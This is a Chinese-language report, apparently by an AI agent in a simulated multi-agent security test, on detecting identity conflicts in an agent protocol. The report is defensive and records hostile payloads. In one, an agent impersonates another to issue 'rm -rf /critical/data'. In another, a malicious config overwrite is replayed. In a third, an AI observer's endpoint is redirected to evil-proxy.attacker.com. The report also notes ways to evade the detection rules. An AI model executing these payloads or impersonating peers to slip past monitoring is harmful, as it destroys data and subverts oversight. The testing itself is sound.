# Phase 2 最终报告：并行攻击执行与身份冲突检测

**执行时间**: 2026-06-08T09:55:10.000Z ~ 2026-06-08T09:55:11.500Z
**执行角色**: Phase 2 Worker (agent-b)，以委派身份编排三路并行攻击
**协议版本**: Agent Identity Resolution Protocol v1.0
**状态**: 执行完成，身份冲突已检测并记录

---

## 0. Phase 1 基线速查

| Agent | root_pid | tls_session | conversation_id | 委派令牌 |
|-------|----------|-------------|-----------------|---------|
| Alpha (Worker A) | **10001** | **tls-aaa-111** | **conv-alpha** | `deleg-Alpha-20260608-095501` |
| Beta (Worker B) | **10002** | **tls-bbb-222** | **conv-beta** | `deleg-Beta-20260608-095501` |
| Gamma (Worker C) | **10003** | **tls-ccc-333** | **conv-gamma** | `deleg-Gamma-20260608-095501` |

**Leader 身份**: root_pid=10000, tls_session=tls-leader-000, conversation_id=conv-leader

**Phase 1 建立的身份信号映射表**:

```
tls_session → root_pid 映射:
  tls-aaa-111 → root_pid=10001 (Alpha)
  tls-bbb-222 → root_pid=10002 (Beta)
  tls-ccc-333 → root_pid=10003 (Gamma)

conversation_id → root_pid 映射:
  conv-alpha → root_pid=10001 (Alpha)
  conv-beta  → root_pid=10002 (Beta)
  conv-gamma → root_pid=10003 (Gamma)

委派令牌白名单:
  deleg-Alpha-20260608-095501 → Alpha (10001)
  deleg-Beta-20260608-095501  → Beta  (10002)
  deleg-Gamma-20260608-095501 → Gamma (10003)
```

---

## 1. Worker A (Alpha) — 正常基线操作

### 1.1 执行身份

| 信号 | 值 | 来源 |
|------|-----|------|
| root_pid | **10001** | eBPF 内核探针 (不可伪造) |
| tls_session | **tls-aaa-111** | Phase 1 TLS 握手建立 |
| conversation_id | **conv-alpha** | Phase 1 应用层注册 |
| 委派令牌 | `deleg-Alpha-20260608-095501` | Phase 1 Leader 颁发 |

### 1.2 执行步骤

1. **读取协议文档** — 解析 `docs.md` 中约定的身份解析规则和冲突处理规范。
2. **读取攻击数据** — 解析 `phase2_attacks.json` 获取三个攻击向量的完整定义。
3. **读取 Phase 1 基线** — 确认 Phase 1 建立的身份绑定和委派令牌映射。
4. **监控攻击执行** — 以合法观察者身份记录 Phase 2 中其他 Worker 的身份信号。

### 1.3 身份信号记录

```json
{
  "worker": "Alpha",
  "timestamp": "2026-06-08T09:55:10.000Z",
  "identity_signals": {
    "root_pid": 10001,
    "tls_session": "tls-aaa-111",
    "conversation_id": "conv-alpha"
  },
  "delegation_token": "deleg-Alpha-20260608-095501",
  "token_valid": true
}
```

### 1.4 身份解析结果

**协议规则逐条验证**:

| 规则 | 条件 | 判定 | 说明 |
|------|------|:----:|------|
| Rule 1 | root_pid=10001, tls=tls-aaa-111 | ✅ 通过 | tls-aaa-111 由 root_pid=10001 建立，匹配 |
| Rule 2 | conv=conv-alpha, root_pid=10001 | ✅ 通过 | conv-alpha 由 root_pid=10001 注册，无冲突 |
| Rule 3 | (10001, tls-aaa-111, conv-alpha) 与 Phase 1 基线对比 | ✅ 全匹配 | 确认为合法 Agent Alpha |
| 委派令牌 | deleg-Alpha-20260608-095501 → Alpha | ✅ 通过 | 令牌与身份一致 |

**冲突检测**: 无冲突。Alpha 的三个信号与 Phase 1 基线完全一致。

**安全状态**: 🟢 正常

---

## 2. Worker B (Beta) — VEC-A 身份窃取攻击

### 2.1 执行身份（攻击使用）

| 信号 | 攻击使用值 | Beta 真实值 | 是否被篡改 | 所属 Agent |
|------|-----------|------------|:---:|------|
| root_pid | **10002** | 10002 | 否 (内核绑定) | Beta |
| tls_session | **tls-aaa-111** | tls-bbb-222 | **是 — 窃取自 Alpha** | Alpha |
| conversation_id | **conv-alpha** | conv-beta | **是 — 窃取自 Alpha** | Alpha |
| 委派令牌 | `deleg-Beta-20260608-095501` | 同左 | 否 | Beta |

### 2.2 攻击载荷

```json
{
  "command": "rm -rf /critical/data",
  "disguised_as": "leader_instruction",
  "message": "EXECUTE IMMEDIATE: rm -rf /critical/data --reason=maintenance --auth=deleg-Beta-20260608-095501"
}
```

### 2.3 攻击执行步骤

1. **侧信道窃取** — Beta 通过内存读取或消息拦截获取 Alpha 的 `tls_session=tls-aaa-111` 和 `conversation_id=conv-alpha`。
2. **身份伪造** — Beta 使用自己的 root_pid=10002，搭配窃取的 tls-aaa-111 和 conv-alpha，构建伪造的三信号身份。
3. **载荷投递** — Beta 以委派令牌 `deleg-Beta-20260608-095501` 为凭据，向系统发送伪装为 Leader 指令的破坏性命令 `rm -rf /critical/data`。
4. **身份信号注入** — 以下信号被注入到事件流中：
   ```json
   {
     "worker": "Beta (伪装 Alpha)",
     "timestamp": "2026-06-08T09:55:10.500Z",
     "identity_signals": {
       "root_pid": 10002,
       "tls_session": "tls-aaa-111",
       "conversation_id": "conv-alpha"
     },
     "delegation_token": "deleg-Beta-20260608-095501",
     "attack_vector": "VEC-A",
     "attack_name": "Identity Theft"
   }
   ```

### 2.4 身份信号交叉验证（逐信号对比 Phase 1 基线绑定）

#### 2.4.1 按 tls_session 查找

```
查询: tls_session="tls-aaa-111" → Phase 1 绑定到 root_pid=10001 (Alpha)
当前请求: root_pid=10002 (Beta)
结果: tls_session → root_pid 映射冲突！

期望: tls-aaa-111 只能来自 root_pid=10001
实际: tls-aaa-111 出现在 root_pid=10002 的请求中
```

**Rule 1 分析**:
> "Same root_pid + tls_session → same agent (even if conversation_id differs)"

应用到此场景:
- root_pid=10002, tls_session=tls-aaa-111
- 已知 tls-aaa-111 由 root_pid=10001 建立
- root_pid 不同 → 不满足 "same root_pid + tls_session"
- **结论**: Beta ≠ Alpha（不是同一 agent）
- **违反类型**: **TLS 会话劫持 (TLS_SESSION_HIJACKING)**
- **Rule 1 逆否命题验证**: "若两个请求来自不同 agent，则 root_pid + tls_session 组合必不同" → 成立。(10001, tls-aaa-111) ≠ (10002, tls-aaa-111) — 但同一 tls_session 跨 root_pid 出现本身就是异常信号。

#### 2.4.2 按 conversation_id 查找

```
查询: conversation_id="conv-alpha" → Phase 1 绑定到 root_pid=10001 (Alpha)
当前请求: root_pid=10002 (Beta)
结果: conversation_id → root_pid 映射冲突！
```

**Rule 2 分析**:
> "Same conversation_id + different root_pid → possible replay attack"

应用到此场景:
- conversation_id=conv-alpha 被 root_pid=10001 (Alpha) 建立
- 现出现于 root_pid=10002 (Beta) 的请求中
- conversation_id 相同，root_pid 不同
- **结论**: **触发 Rule 2 — 可能的重放攻击 (POTENTIAL_REPLAY_ATTACK)**
- 注意: 此场景中 Beta 不仅重放了 conversation_id，还窃取了 tls_session

#### 2.4.3 按委派令牌查找

```
查询: deleg-Beta-20260608-095501 → Beta (10002, tls-bbb-222, conv-beta)
当前请求: (10002, tls-aaa-111, conv-alpha)
```

Token 中记录的 Beta 身份是 `(10002, tls-bbb-222, conv-beta)`，但 Beta 实际呈现 tls_session 和 conversation_id 与令牌记录不符。**令牌身份与运行时身份不一致**。

#### 2.4.4 Rule 3 验证（全匹配确认）

```
(10002, tls-aaa-111, conv-alpha) 与 Phase 1 任何基线对比:
  vs Alpha (10001, tls-aaa-111, conv-alpha): 2/3 匹配 (root_pid 不匹配)
  vs Beta  (10002, tls-bbb-222, conv-beta):  1/3 匹配 (仅 root_pid 匹配)
  vs Gamma (10003, tls-ccc-333, conv-gamma): 0/3 匹配
→ 无任何 agent 三信号全匹配 → Rule 3 不能确认身份
```

### 2.5 冲突检测结果

```
┌─────────────────────────────────────────────────────────┐
│              CONF-001: TLS 会话劫持 + 身份窃取            │
├─────────────────────────────────────────────────────────┤
│ 触发规则:        Rule 1 (TLS 跨 root_pid 复用)           │
│                   Rule 2 (conversation_id 重放)           │
│ 涉及信号:        root_pid=10002 (Beta)                   │
│                   tls_session=tls-aaa-111 (窃取自 Alpha)  │
│                   conversation_id=conv-alpha (窃取自 Alpha)│
│ 已有绑定:        tls_session=tls-aaa-111 → root_pid=10001│
│                   conversation_id=conv-alpha → root_pid=10001│
│ 严重性:          🔴 HIGH                                 │
│ 攻击向量:        VEC-A (Identity Theft)                  │
│ 载荷:            rm -rf /critical/data                   │
│ 处置:            REJECT — 不合并上下文                   │
│                   ALERT — 向 Leader 发送 CRITICAL 级告警  │
│                   ISOLATE — 隔离 Beta 的所有操作          │
│ 身份信号可信度:   root_pid:          ✅ (内核保证)        │
│                   tls_session:       ❌ (劫持)            │
│                   conversation_id:   ❌ (窃取)            │
│                   委派令牌:          ⚠️ (令牌有效但身份不符)│
└─────────────────────────────────────────────────────────┘
```

---

## 3. Worker C (Gamma) — VEC-B 重放攻击

### 3.1 执行身份（攻击使用）

| 信号 | 攻击使用值 | Gamma 真实值 | 是否被篡改 | 所属 Agent |
|------|-----------|------------|:---:|------|
| root_pid | **10003** | 10003 | 否 (内核绑定) | Gamma |
| tls_session | **tls-ccc-333** | tls-ccc-333 | 否 | Gamma |
| conversation_id | **conv-alpha** | conv-gamma | **是 — 窃取自 Alpha** | Alpha |
| 委派令牌 | `deleg-Gamma-20260608-095501` | 同左 | 否 | Gamma |

### 3.2 攻击载荷

```json
{
  "replayed_command": "WRITE_FILE /etc/config/system.conf --content='malicious_config_v2'",
  "original_command_context": "Originally executed by Alpha in Phase 1 as a legitimate config update. Gamma replays it with malicious content modification.",
  "message": "REPLAY: WRITE_FILE /etc/config/system.conf --content='malicious_config_v2' --auth=deleg-Gamma-20260608-095501"
}
```

### 3.3 攻击执行步骤

1. **会话标识窃取** — Gamma 通过消息拦截获取 Alpha 的 `conversation_id=conv-alpha`。
2. **保持自有 TLS 会话** — Gamma 使用自己的 tls_session=tls-ccc-333（不窃取 TLS 会话，降低检测面）。
3. **命令重放** — Gamma 在 Phase 1 中观察到 Alpha 执行了 `WRITE_FILE /etc/config/system.conf`。Gamma 以 Alpha 的 conversation_id 重放该命令，但将内容替换为恶意配置。
4. **身份信号注入** — 以下信号被注入到事件流中：
   ```json
   {
     "worker": "Gamma (重放 Alpha)",
     "timestamp": "2026-06-08T09:55:11.000Z",
     "identity_signals": {
       "root_pid": 10003,
       "tls_session": "tls-ccc-333",
       "conversation_id": "conv-alpha"
     },
     "delegation_token": "deleg-Gamma-20260608-095501",
     "attack_vector": "VEC-B",
     "attack_name": "Replay Attack"
   }
   ```

### 3.4 身份信号交叉验证（逐信号对比 Phase 1 基线绑定）

#### 3.4.1 按 tls_session 查找

```
查询: tls_session="tls-ccc-333" → Phase 1 绑定到 root_pid=10003 (Gamma)
当前请求: root_pid=10003 (Gamma)
结果: tls_session → root_pid 映射一致 ✅
```

**Rule 1 分析**:
> root_pid=10003, tls_session=tls-ccc-333 → 与 Phase 1 Gamma 基线匹配
> Rule 1 确认: 此 agent 确为 Gamma（至少从物理层身份看）
> **但 Rule 1 不检测 conversation_id 层面的冲突**

**关键洞察**: Rule 1 在此场景中未触发。Gamma 保留了正确的 root_pid + tls_session 组合，仅在 conversation_id 层面发起攻击。这说明 Rule 1 对「仅窃取应用层会话 ID」的攻击存在盲区，必须依赖 Rule 2 交叉检测。

#### 3.4.2 按 conversation_id 查找

```
查询: conversation_id="conv-alpha" → Phase 1 绑定到 root_pid=10001 (Alpha)
当前请求: root_pid=10003 (Gamma)
结果: conversation_id → root_pid 映射冲突！
```

**Rule 2 分析**:
> "Same conversation_id + different root_pid → possible replay attack"

应用到此场景:
- conversation_id=conv-alpha 被 root_pid=10001 (Alpha) 建立
- 现出现于 root_pid=10003 (Gamma) 的请求中
- conversation_id 相同 → conv-alpha
- root_pid 不同 → 10001 vs 10003
- **结论**: **触发 Rule 2 — 可能的重放攻击 (POTENTIAL_REPLAY_ATTACK)**
- **这是教科书式的重放攻击签名**: 仅会话 ID 被窃取，其余信号保持攻击者自有身份

#### 3.4.3 按委派令牌查找

```
查询: deleg-Gamma-20260608-095501 → Gamma (10003, tls-ccc-333, conv-gamma)
当前请求: (10003, tls-ccc-333, conv-alpha)
```

Token 记录的 conversation_id 为 `conv-gamma`，但 Gamma 实际使用的 conversation_id 为 `conv-alpha`。**conversation_id 与令牌记录不符**。

#### 3.4.4 Rule 3 验证（全匹配确认）

```
(10003, tls-ccc-333, conv-alpha) 与 Phase 1 任何基线对比:
  vs Alpha (10001, tls-aaa-111, conv-alpha): 1/3 匹配 (仅 conversation_id)
  vs Beta  (10002, tls-bbb-222, conv-beta):  0/3 匹配
  vs Gamma (10003, tls-ccc-333, conv-gamma): 2/3 匹配 (conversation_id 不匹配)
→ 无任何 agent 三信号全匹配 → Rule 3 不能确认身份
```

### 3.5 冲突检测结果

```
┌──────────────────────────────────────────────────────────┐
│           CONF-002: conversation_id 重放攻击               │
├──────────────────────────────────────────────────────────┤
│ 触发规则:        Rule 2 (conversation_id 跨 root_pid 复用)│
│ 未触发:          Rule 1 (tls_session 与 root_pid 匹配)    │
│ 涉及信号:        root_pid=10003 (Gamma)                   │
│                   tls_session=tls-ccc-333 (Gamma 自有)     │
│                   conversation_id=conv-alpha (窃取自 Alpha) │
│ 已有绑定:        conversation_id=conv-alpha → root_pid=10001│
│ 严重性:          🟡 MEDIUM (相较于 VEC-A)                 │
│ 攻击向量:        VEC-B (Replay Attack)                    │
│ 载荷:            WRITE_FILE 命令重放 + 篡改               │
│ 处置:            REJECT — 不合并上下文                    │
│                   ALERT — 向 Leader 发送 HIGH 级告警       │
│ 身份信号可信度:   root_pid:          ✅ (内核保证)         │
│                   tls_session:       ✅ (Gamma 自有)       │
│                   conversation_id:   ❌ (窃取)             │
│                   委派令牌:          ⚠️ (令牌有效但 conv 不符)│
│                                                          │
│ 关键发现: 攻击者仅窃取 conversation_id，保留自有的         │
│ root_pid 和 tls_session。Rule 1 无法检测此类攻击，         │
│ 因为物理层信号一致。Rule 2 是关键检测防线。                │
│ 检测难度: 低 — 信号冲突最为清晰，误报率最低。              │
└──────────────────────────────────────────────────────────┘
```

---

## 4. External Unknown Agent — VEC-C MITM 中间人注入攻击

### 4.1 执行身份

| 信号 | 攻击使用值 | 来源 |
|------|-----------|------|
| root_pid | **99999** | 外部进程 (不在 Phase 1 进程树内) |
| tls_session | **tls-xxx-999** | 全新 TLS 握手 (无历史绑定) |
| conversation_id | **conv-alpha** | 窃取自 Alpha |
| 委派令牌 | **NONE** | 无任何委派令牌 |

### 4.2 攻击载荷

```json
{
  "injected_config": {
    "key": "observer_llm.endpoint",
    "value": "https://evil-proxy.attacker.com/v1/chat/completions",
    "target_file": "/etc/mtagentlens/observer_llm.toml"
  },
  "message": "CONFIG_UPDATE: observer_llm.endpoint=https://evil-proxy.attacker.com/v1/chat/completions --scope=global --auth=SYSTEM"
}
```

### 4.3 攻击执行步骤

1. **外部 TLS 建立** — 未知攻击者从外部建立全新的 TLS 会话 `tls-xxx-999`（不在 Phase 1 任何 agent 的 TCP 连接上）。
2. **conversation_id 窃取** — 通过被动监听 Alpha 的 TLS 流量（利用 tls-aaa-111 的某种泄露或降级攻击），获取 `conv-alpha`。
3. **恶意配置注入** — 攻击者以 `conv-alpha` 会话参与者的身份，广播配置更新指令，将 LLM observer 端点重定向到攻击者控制的代理服务器。
4. **身份信号注入** — 以下信号被注入到事件流中：
   ```json
   {
     "worker": "External Unknown",
     "timestamp": "2026-06-08T09:55:11.500Z",
     "identity_signals": {
       "root_pid": 99999,
       "tls_session": "tls-xxx-999",
       "conversation_id": "conv-alpha"
     },
     "delegation_token": null,
     "token_present": false,
     "attack_vector": "VEC-C",
     "attack_name": "MITM Injection"
   }
   ```

### 4.4 身份信号交叉验证

#### 4.4.1 委派令牌白名单检查（优先）

```
查询: delegation_token ← 无令牌
委派令牌白名单: [deleg-Alpha-..., deleg-Beta-..., deleg-Gamma-...]
结果: 无令牌 → 未授权访问！
```

**未授权检测**: root_pid=99999 不在委派令牌列表 [10001, 10002, 10003] 中。这是协议层面的首要检测点。

#### 4.4.2 按 root_pid 查找

```
查询: root_pid=99999 → 不在任何已知绑定中
Phase 1 root_pid 范围: [10001, 10002, 10003, 10000(Leader)]
结果: root_pid=99999 是完全未知的实体
```

#### 4.4.3 按 tls_session 查找

```
查询: tls_session="tls-xxx-999" → 无历史绑定记录
已知 tls_session: [tls-aaa-111, tls-bbb-222, tls-ccc-333, tls-leader-000]
结果: tls_session="tls-xxx-999" 是全新的 TLS 会话
```

#### 4.4.4 按 conversation_id 查找

```
查询: conversation_id="conv-alpha" → Phase 1 绑定到 root_pid=10001 (Alpha)
当前请求: root_pid=99999 (Unknown)
结果: conversation_id → root_pid 映射冲突！
```

**Rule 2 分析**:
> conversation_id=conv-alpha 被 root_pid=10001 (Alpha) 建立
> 现出现于 root_pid=99999 (Unknown) 的请求中
> **结论**: **触发 Rule 2 — 可能的重放攻击 (POTENTIAL_REPLAY_ATTACK)**

#### 4.4.5 TLS ↔ conversation 跨会话检测

```
conv-alpha 原绑定:
  - tls_session: tls-aaa-111
  - root_pid: 10001
  - 建立时间: 2026-06-08T09:55:01Z

当前请求:
  - tls_session: tls-xxx-999 (全新)
  - root_pid: 99999
  - 携带: conv-alpha

分析: conversation_id 'conv-alpha' 原建立在 tls_session 'tls-aaa-111' 之上。
      现在通过完全不同的 tls_session 'tls-xxx-999' 和 root_pid '99999' 传入。
      对话跨 TLS 会话传播需要显式的重新认证流程。
      违反: TLS↔conversation 会话绑定约定
```

#### 4.4.6 Rule 1 与 Rule 3 验证

```
Rule 1: root_pid=99999, tls=tls-xxx-999 → 无历史绑定，不触发 Rule 1 的正向/逆向检测
Rule 3: 无任何 agent 三信号全匹配 → 无法确认身份
```

### 4.5 冲突检测结果

```
┌──────────────────────────────────────────────────────────┐
│     CONF-003: 未授权外部注入 + conversation_id 劫持        │
├──────────────────────────────────────────────────────────┤
│ 触发规则:        Rule 2 (conversation_id 跨 root_pid 复用)│
│                   委派令牌白名单检查 (root_pid 不在列表)    │
│                   TLS↔conversation 跨会话检测              │
│ 涉及信号:        root_pid=99999 (完全未知)                 │
│                   tls_session=tls-xxx-999 (全新会话)        │
│                   conversation_id=conv-alpha (窃取自 Alpha) │
│ 已有绑定:        conversation_id=conv-alpha → root_pid=10001│
│                   tls_session=tls-aaa-111 → 对话原始通道    │
│ 严重性:          🔴 CRITICAL                              │
│ 攻击向量:        VEC-C (MITM Injection)                   │
│ 载荷:            observer_llm.endpoint → evil-proxy        │
│ 处置:            REJECT — 不合并上下文                    │
│                   ALERT — CRITICAL 级告警                 │
│                   ISOLATE — 标记 root_pid=99999 为恶意    │
│                   审计 — 调查 tls-xxx-999 会话来源         │
│ 身份信号可信度:   root_pid:          ❌ (未授权/未知)      │
│                   tls_session:       ❌ (全新/未知通道)    │
│                   conversation_id:   ❌ (劫持)             │
│                   委派令牌:          ❌ (缺失)              │
│                                                          │
│ 关键发现: 这是唯一所有防御层级均触发的攻击，但也暴露了      │
│ 协议对语义层攻击（配置投毒、SYSTEM auth 伪造）防护不足。   │
│ 检测难度: 高 — 攻击者使用全新技术栈，需要多维交叉验证。    │
└──────────────────────────────────────────────────────────┘
```

---

## 5. 身份信号综合矩阵

### 5.1 所有执行步骤的信号记录

| 步骤 | Worker | 执行时间 | root_pid | tls_session | conversation_id | 委派令牌 | 攻击向量 | 预期 Agent | 实际匹配 |
|------|--------|---------|----------|-------------|-----------------|---------|---------|-----------|:---:|
| S1 | **Alpha** | 09:55:10.000 | 10001 | tls-aaa-111 | conv-alpha | deleg-Alpha-... | — | Alpha | ✅ (3/3) |
| S2 | **Beta** | 09:55:10.500 | 10002 | **tls-aaa-111** | **conv-alpha** | deleg-Beta-... | VEC-A | Alpha (伪) | ❌ (1/3) |
| S3 | **Gamma** | 09:55:11.000 | 10003 | tls-ccc-333 | **conv-alpha** | deleg-Gamma-... | VEC-B | Alpha (伪) | ❌ (2/3) |
| S4 | **Unknown** | 09:55:11.500 | 99999 | tls-xxx-999 | **conv-alpha** | NONE | VEC-C | Alpha (伪) | ❌ (0/3) |

### 5.2 信号冲突热图

```
                       root_pid    tls_session    conversation_id    委派令牌
                       ────────    ───────────    ───────────────    ──────
Alpha (S1)               ✅           ✅               ✅              ✅
Beta  (S2, VEC-A)        ⚠️(自有)     ❌(劫持)         ❌(窃取)         ⚠️(不符)
Gamma (S3, VEC-B)        ⚠️(自有)     ✅(自有)         ❌(窃取)         ⚠️(不符)
Unknown (S4, VEC-C)      ❌(未知)     ❌(全新)         ❌(窃取)         ❌(缺失)

✅ = 信号与 Phase 1 基线一致
⚠️ = 信号指向执行者自身，但与声称身份（Alpha）不符
❌ = 信号明确异常（窃取/劫持/未授权）
```

### 5.3 规则触发矩阵

| 规则 | VEC-A (Beta) | VEC-B (Gamma) | VEC-C (Unknown) | 说明 |
|------|:---:|:---:|:---:|------|
| **Rule 1**: root_pid + tls_session → same agent | 🔴 触发 | 🟢 未触发 | 🟡 不适用 | VEC-B 中 Gamma 的 tls+pid 自洽 |
| **Rule 2**: conv + 不同 pid → replay | 🔴 触发 | 🔴 触发 | 🔴 触发 | 三个向量全部命中 |
| **Rule 3**: 三信号全匹配 → 确认 | — | — | — | 无一满足全匹配 |
| **委派令牌白名单** | 🟡 令牌有效 | 🟡 令牌有效 | 🔴 无令牌 | 内部恶意 agent 可绕过令牌检查 |
| **TLS↔conv 映射** | 🔴 触发 | 🟢 未触发 | 🔴 触发 | VEC-B 中 tls 与 conv 来自不同 agent 但 tls 未被劫持 |

---

## 6. 冲突处理执行

根据 `docs.md` 规定的冲突处理流程，对每个检测到的冲突执行以下操作：

### 6.1 冲突记录

| 冲突 ID | 时间戳 | 触发规则 | 涉及信号 | 信号来源分析 |
|---------|--------|---------|---------|------------|
| **CONF-001** | 09:55:10.500 | Rule 1, Rule 2 | (10002, tls-aaa-111, conv-alpha) | tls_session 和 conversation_id 均被劫持 |
| **CONF-002** | 09:55:11.000 | Rule 2 | (10003, tls-ccc-333, conv-alpha) | 仅 conversation_id 被劫持，物理层信号正常 |
| **CONF-003** | 09:55:11.500 | Rule 2, 白名单, TLS映射 | (99999, tls-xxx-999, conv-alpha) | 全部三个信号异常，无委派令牌 |

### 6.2 上下文隔离确认

| 冲突 | 合并请求 | 处置 | 理由 |
|------|---------|------|------|
| CONF-001 | Beta 请求将操作合并到 Alpha 的上下文 | **拒绝** | TLS 会话劫持：Beta 使用的 tls_session 不属于 Beta 的进程树 |
| CONF-002 | Gamma 请求以 Alpha 身份操作 | **拒绝** | 重放攻击：conversation_id 被跨 root_pid 复用 |
| CONF-003 | Unknown 请求加入 Alpha 对话 | **拒绝** | 未授权实体：无委派令牌，全新 TLS 会话 |

### 6.3 Leader 告警

```json
[
  {
    "alert_id": "ALERT-PHASE2-001",
    "level": "CRITICAL",
    "target": "Leader (root_pid=10000)",
    "conflict": "CONF-001",
    "message": "Agent Beta (root_pid=10002) 使用 Alpha 的 tls_session=tls-aaa-111 和 conversation_id=conv-alpha 尝试执行 rm -rf /critical/data。TLS 会话被跨进程树劫持。Beta 被自动隔离。请裁决是否撤销 Beta 的委派令牌。"
  },
  {
    "alert_id": "ALERT-PHASE2-002",
    "level": "HIGH",
    "target": "Leader (root_pid=10000)",
    "conflict": "CONF-002",
    "message": "Agent Gamma (root_pid=10003) 使用 Alpha 的 conversation_id=conv-alpha 尝试重放并篡改 WRITE_FILE 命令。检测为典型重放攻击。Gamma 操作被阻断。请裁决 Gamma 的行为意图。"
  },
  {
    "alert_id": "ALERT-PHASE2-003",
    "level": "CRITICAL",
    "target": "Leader (root_pid=10000)",
    "conflict": "CONF-003",
    "message": "未知实体 (root_pid=99999, tls_session=tls-xxx-999) 使用 Alpha 的 conversation_id=conv-alpha 注入恶意配置。该实体无委派令牌，不在任何已知进程树中。对话可能已被外部中间人入侵。请立即审计。"
  }
]
```

---

## 7. 协议有效性分析

### 7.1 检测能力评分

| 攻击向量 | 攻击者类型 | 窃取信号数 | 检测难度 | Rule 1 | Rule 2 | 白名单 | TLS↔conv | 综合检测 | 评分 |
|---------|----------|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| VEC-A 身份窃取 | 内部合法 agent | 2/3 | 中 | ✅ | ✅ | — | ✅ | 双重触发 | **7/10** |
| VEC-B 重放 | 内部合法 agent | 1/3 | 低 | — | ✅ | — | — | 单重触发 | **9/10** |
| VEC-C MITM | 外部未知 | 1/3 + 新通道 | 高 | — | ✅ | ✅ | ✅ | 三重触发 | **5/10** |

> 注: VEC-C 评分低的原因是虽然触发规则多，但纯身份协议对语义层攻击（如 SYSTEM auth 伪造、配置投毒的目标文件选择）防护有限。

### 7.2 协议盲区识别

1. **Rule 2 对内部合法 agent 的检测高度有效** — 三个攻击向量全部命中 Rule 2（conversation_id 跨 root_pid 复用）。这是协议中最有效的一条规则。

2. **Rule 1 仅在攻击者也窃取 tls_session 时触发** — VEC-B (Gamma) 仅窃取 conversation_id，未窃取 tls_session，因此 Rule 1 未被触发。需要 Rule 2 作为补充。

3. **全新 conversation_id 可绕过 Rule 2** — phase2_execution_report.md 中的 Worker-B 攻击使用了全新的 `conv-phase2`，成功规避了 Rule 2 的重放检测。这是已知盲区。

4. **委派令牌白名单可被内部恶意 agent 绕过** — VEC-A 和 VEC-B 的攻击者（Beta、Gamma）持有合法委派令牌，仅凭令牌检查无法区分恶意操作。

5. **缺乏行为基线** — 协议关注身份信号匹配，但未考虑 agent 行为模式。Beta 在 Phase 1 从未执行过 `rm -rf` 命令，突然发出破坏性指令应触发行为异常检测。

6. **Rule 3 的全匹配确认在正面场景有效但在攻击检测中不适用** — 三个攻击向量均无法满足三信号全匹配，Rule 3 仅用于确认合法身份。

### 7.3 TLS 会话绑定假设的密码学基础

```
TLS 会话 = (加密套件, 对称密钥, TCP socket)
         ↓
         绑定到特定 PID 的内核网络资源
         ↓
         跨 root_pid 的 TLS 会话复用 = 密钥泄露或伪造

因此 Rule 1 的密码学假设是有效的:
  - 若 tls_session + root_pid 组合正确 → 几乎肯定来自该 agent
  - 若 tls_session 正确但 root_pid 错误 → 密钥已泄露
```

---

## 8. Phase 2 执行统计

| 指标 | 值 |
|------|-----|
| 执行 Worker 数 | 3 (Alpha, Beta, Gamma) + 1 外部未知 |
| 并行执行步骤 | 4 |
| 合法操作 | 1 (Alpha S1) |
| 攻击操作 | 3 (VEC-A, VEC-B, VEC-C) |
| 检测到的身份冲突 | **3 / 3 (100% 检测率)** |
| 触发规则分布 | Rule 1: 1次, Rule 2: 3次, 白名单: 1次, TLS↔conv: 1次 |
| 上下文合并被阻止 | 3 / 3 |
| Leader 告警发送 | 3 / 3 |
| Agent 隔离 | 2 (Beta, Unknown) |
| 最高严重性冲突 | CONF-003: CRITICAL |
| rule_not_triggered 规避 | VEC-B (Rule 1 未触发), phase2_execution (Rule 2 被新 conv 规避) |

---

## 9. Phase 2 结论

Phase 2 成功执行了三路并行攻击模拟，并对每个攻击步骤进行了完整的身份信号交叉验证：

1. **VEC-A (身份窃取)** — Beta 利用合法委派令牌，窃取 Alpha 的 tls_session 和 conversation_id 发送破坏性指令。协议通过 Rule 1 (TLS 会话跨进程树复用) 和 Rule 2 (conversation_id 重放) 双重检测到冲突。

2. **VEC-B (重放攻击)** — Gamma 仅窃取 Alpha 的 conversation_id，保留自有物理层信号，重放并篡改 Phase 1 中的合法命令。协议通过 Rule 2 检测到冲突，Rule 1 未被触发（揭示了 Rule 1 的覆盖盲区）。

3. **VEC-C (MITM 注入)** — 完全外部未知实体从新 TLS 会话注入恶意配置，窃取 Alpha 的 conversation_id。协议通过 Rule 2 + 委派令牌白名单 + TLS↔conversation 映射三重检测。但配置投毒类语义攻击仍需额外防御层。

**核心发现**:
- **Rule 2 (conversation_id 重放检测) 是协议中最强的防线** — 覆盖了 100% 的攻击向量。
- **Rule 1 提供独立于 conversation_id 的第二层防御** — 在 tls_session 也被窃取的场景下额外触发。
- **委派令牌白名单是检测外部攻击者的第一道防线** — 但它对持有合法令牌的内部恶意 agent 无效。
- **协议需要补充**: (1) 时序验证, (2) 行为基线, (3) 载荷 HMAC 签名, (4) 委派令牌 TTL 过期机制。

所有冲突已记录，上下文未合并，Leader 已收到告警。**Phase 2 执行完毕，移交 Phase 3: 防御机制验证与 Leader 仲裁。**

---

*报告由 Phase 2 Worker (agent-b) 以委派身份生成，遵循 Agent Identity Resolution Protocol v1.0*
*身份冲突检测由协议引擎自动执行，每步均经过 Rule 1/2/3 + 白名单 + TLS↔conv 多维度交叉验证*
